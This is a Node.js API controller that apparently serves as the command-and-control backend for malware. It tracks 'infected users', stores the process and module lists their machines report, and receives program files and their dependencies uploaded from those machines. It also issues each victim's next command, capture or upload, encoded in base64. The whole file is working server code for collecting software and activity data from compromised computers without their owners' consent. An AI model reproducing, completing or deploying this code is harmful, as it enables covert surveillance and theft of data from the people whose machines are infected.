var cheerio = require('cheerio');
let crypto = require('crypto');
let fs = require('fs');
let path = require('path');
let View = require('../views/base');

let Constants = require('../util/constant');
let Helper = require('../util/helper');

let BaseController = require('./BaseController');

let InfectedUserModel = require('../models/InfectedUserModel');
let ProgramModel = require('../models/ProgramModel');
let UploadModel = require('../models/UploadModel');

module.exports = BaseController.extend({
    name: 'ApiController',

    /**
     * Get process list information from the clients
     * @param req
     * @param res
     * @param next
     * @returns {Promise<*>}
     */
    updateProcessList: async function (req, res, next) {
        const userid = req.body.id;
        const username = req.body.username;
        try {
            if (userid && req.body.pl) {
                const process_list = req.body.pl;
                for (let i in process_list) {
                    const process_name = process_list[i].pn;                // process name
                    const program_path = process_list[i].pp;                // program path
                    const modules = JSON.stringify(process_list[i].ml);     // dependency modules
                    const executedAt = process_list[i].rt;                  // executed time

                    // Check if same process name and program path
                    let program_record = await ProgramModel.findOne({ process_name, program_path, user_id: userid });
                    if (program_record) {       // If exist, just update modules and execute time
                        await program_record.updateOne({ modules, executedAt, username });
                    } else {                    // If not exist, create one
                        program_record = new ProgramModel({
                           user_id: userid, username, process_name, program_path, modules, executedAt, program_name: process_name
                        });
                        await program_record.save();
                    }
                }
            }
        } catch (err) {
            req.body.st = Constants.RES_FAILED;
            console.log(err);
        }
        next();
    },

    /**
     * Upload file from client
     * @param req
     * @param res
     * @param next
     * @returns {Promise<void>}
     */
    uploadFile : async function (req, res, next) {
        try {
            const upload_record_id = req.body.mi;
            const processing_index = Number(req.body.pi);
            const upload_module_path = req.body.mp;
            let upload_record = await UploadModel.findOne({ id: upload_record_id });
            if (upload_record) {
                const upload_type = upload_record.upload_type;

                let oldPath = req.file.path;
                let target_dir = `public/uploads/${upload_record_id}/`;

                if (upload_type === 'all') {
                    const main_module_dir = path.dirname(upload_record.module_path);
                    const upload_module_dir = path.dirname(upload_module_path);

                    if (upload_module_dir.startsWith(main_module_dir)) {
                        target_dir += `${upload_module_dir.substring(main_module_dir.length)}/`;
                    }
                }

                let newPath = `${target_dir}${req.file.originalname}`;
                console.log(`target dir ${target_dir}`);

                // Create directory if not exist
                if (!fs.existsSync(target_dir)) {
                    fs.mkdirSync(target_dir, { recursive: true });
                }

                fs.renameSync(oldPath, newPath);

                req.body.id = upload_record.user_id;
                if (upload_type === 'one') {                         // If upload only one file, update status to finish
                    await upload_record.update({ status: 2 });
                } else {        // If upload all dependencies, update status only when upload all dependencies
                    const dependencies = JSON.parse(upload_record.dependencies);
                    if (dependencies.length <= processing_index) {
                        await upload_record.update({ status: 2 });
                    } else {
                        await upload_record.update({ status: 1, processing_index: processing_index + 1 });
                    }
                }
            }
        } catch (err) {
            req.body.st = Constants.RES_FAILED;
            console.log(err);
        }
        next();
    },

    /**
     * Invalid module when checking for uploading
     * @param req
     * @param res
     * @param next
     * @returns {Promise<void>}
     */
    invalidModule : async function (req, res, next) {
        try {
            const upload_record_id = req.body.cp.mi;
            const module_name = req.body.cp.mn;
            const processing_index = Number(req.body.cp.pi);

            let upload_record = await UploadModel.findOne({ id: upload_record_id });
            if (upload_record) {
                req.body.id = upload_record.user_id;
                let upload_type = upload_record.upload_type;
                if (upload_type == 'one') {                         // If upload only one file, update status to finish
                    await upload_record.update({ status: 3 });
                } else {        // If upload all dependencies, update status only when upload all dependencies
                    let failed_modules = upload_record.failed_modules;
                    failed_modules += module_name + '\n';
                    let dependencies = JSON.parse(upload_record.dependencies);
                    if (dependencies.length <= processing_index) {
                        await upload_record.update({ status: 2, failed_modules: failed_modules });
                    } else {
                        await upload_record.update({
                            processing_index: processing_index + 1,
                            failed_modules: failed_modules
                        });
                    }
                }
            }
        } catch (err) {
            req.body.st = Constants.RES_FAILED;
            console.log(err);
        }
        next();
    },

    /**
     * Check all dependencies when uploading all
     * @param req
     * @param res
     * @param next
     * @returns {Promise<void>}
     */
    dependencyCheck : async function (req, res, next) {
        try {
            const upload_record_id = req.body.cp.mi;
            const main_module_path = req.body.cp.mp;
            const dependencies = JSON.stringify(req.body.cp.dp);

            let upload_record = await UploadModel.findOne({ id: upload_record_id });
            if (upload_record) {
                req.body.id = upload_record.user_id;
                await upload_record.update({
                    module_path: main_module_path,
                    dependencies: dependencies,
                    processing_index: 0
                });
            }
        } catch (err) {
            req.body.st = Constants.RES_FAILED;
            console.log(err);
        }
        next();
    },

    /**
     * Generate next command for the specific user
     * @param req
     * @param res
     * @param next
     * @returns {Promise<void>}
     */
    genNextCommand: async function (req, res, next) {
        let userid = req.body.id;
        // Default command code is capture command code
        let response = {
            id: userid,
            ac: Constants.CMD_ACTION_RUN,       // action code
            rc: req.originalUrl,                // request code
            cc: Constants.CMD_CAPTURE,          // next command code
            cp: {}                              // command param
        };

        try {
            // Check user's status
            let user_record = await InfectedUserModel.findOne({ id: userid });
            if (user_record) {
                response.ac = user_record.status === 0 ? Constants.CMD_ACTION_RUN : Constants.CMD_ACTION_PAUSE;
            }

            if (response.ac !== Constants.CMD_ACTION_PAUSE) {
                // Find upload records which status is not 2(finished) and 3(failed)
                let upload_records = await UploadModel.find({
                    $and: [
                        { user_id: userid, status: { $ne: 2 }},
                        { user_id: userid, status: { $ne: 3 }}
                    ]})
                  .sort({ createdAt: 1 }).limit(1);
                if (upload_records.length > 0) {
                    let upload_record = upload_records[0];

                    response.cc = Constants.CMD_UPLOAD;
                    response.cp = {
                        mi: upload_record.id,
                        mn: upload_record.module_name,
                        mp: upload_record.module_path,
                        ut: upload_record.upload_type,
                    };

                    // When in case of uploading all dependencies
                    if (upload_record.upload_type == 'all') {
                        response.cp.pi = upload_record.processing_index;
                        // If first time to upload, check program folder structure first
                        if (upload_record.processing_index < 0) {
                            response.cc = Constants.CMD_DEPENDENCY_CHECK;
                            response.cp.dp = JSON.parse(upload_record.dependencies);
                        }
                        // If not first time, upload next module
                        else {
                            let dependencies = JSON.parse(upload_record.dependencies);
                            let processing_index = upload_record.processing_index;
                            while (true) {
                                if (processing_index >= dependencies.length) {
                                    await upload_record.update({ status: 2 });
                                    response.cc = Constants.CMD_CAPTURE;
                                    response.cp = {};
                                    break;
                                }
                                response.cp.mn = dependencies[processing_index].mn;
                                response.cp.mp = dependencies[processing_index].mp;
                                // If current index module is for directory, then make directory in the linked path
                                const module_relative_path = dependencies[processing_index].mr;
                                if (module_relative_path) {
                                    let target_dir = `public/uploads/${upload_record.id}/${module_relative_path}`;
                                    try {
                                        fs.mkdirSync(target_dir, { recursive: true });
                                    } catch (err) {
                                        console.log(`Exception in making directory ${err}`);
                                    }
                                    processing_index += 1;
                                    await upload_record.update({ processing_index: processing_index });
                                } else {
                                    break;
                                }
                            }
                        }
                    }
                }
            }
        } catch (err) {
            req.body.st = Constants.RES_FAILED;
            console.log(err);
        }

        console.log(`response ${JSON.stringify(response)}`);
        return res.send(Helper.json2Base64(response));
    },
});

